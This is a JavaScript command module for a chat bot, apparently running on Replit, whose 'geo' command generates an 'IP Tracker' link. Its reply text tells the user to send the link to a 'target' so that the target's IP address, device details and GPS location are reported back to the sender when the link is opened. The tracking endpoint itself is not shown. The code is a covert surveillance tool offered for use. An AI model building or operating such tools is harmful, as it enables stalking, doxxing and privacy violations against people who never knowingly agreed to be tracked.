const path = require('path');
const fs = require('fs');

module.exports = {
    name: 'geo',
    description: 'Create a link to get device and location info.',
    async execute(client, message, args) {
        try {
            // Detect the Replit domain dynamically
            const domain = process.env.REPLIT_DEV_DOMAIN || process.env.REPLIT_DOMAINS || '';
            
            if (!domain) {
                return message.reply("❌ Error: Could not determine server URL. Please ensure the bot is running on Replit and the Webview is active.");
            }

            const trackerUrl = `https://${domain}/track`;
            const replyText = `📍 *IP Tracker Link Generated:*\n\n` +
                              `🔗 ${trackerUrl}\n\n` +
                              `*Instructions:*\n` +
                              `1. Send this link to the target.\n` +
                              `2. Once they open it, their info will be sent to your logs/chat.\n` +
                              `3. Results will include IP, Device Info, and GPS (if permitted).`;

            const target = message.fromMe ? message.to : message.from;
            await client.sendMessage(target, replyText);

        } catch (error) {
            console.error('Geo Command Error:', error);
            message.reply("❌ Error generating tracker link.");
        }
    }
};